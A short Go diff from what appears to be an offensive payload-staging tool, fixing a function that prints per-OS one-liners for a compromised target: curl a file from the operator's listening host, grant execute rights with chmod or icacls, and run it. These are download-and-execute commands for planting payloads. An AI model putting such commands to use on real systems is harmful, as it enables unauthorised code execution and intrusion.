@@ -159,10 +159,10 @@ func PrintCommandExamples(s *Server) {
 
 	if s.targetOS == "windows" {
 		curlLine = fmt.Sprintf("curl http://%s:%s%s -O\n", s.lhost, s.bindPort, s.plantPath)
-		curlAndExecLine = fmt.Sprintf("curl http://%s:%s%s -O && chmod +x %s && ./%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
+		curlAndExecLine = fmt.Sprintf("curl.exe http://%s:%s%s -O && icacls %s /grant Everyone:RX  && ./%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
 	} else {
 		curlLine = fmt.Sprintf("curl http://%s:%s%s -O\n", s.lhost, s.bindPort, s.plantPath)
-		curlAndExecLine = fmt.Sprintf("curl http://%s:%s%s -O && icacls /grant Everyone:RX %s && .\\%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
+		curlAndExecLine = fmt.Sprintf("curl http://%s:%s%s -O && chmod +x %s && ./%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
 
 	}
 	fmt.Print(curlLine)
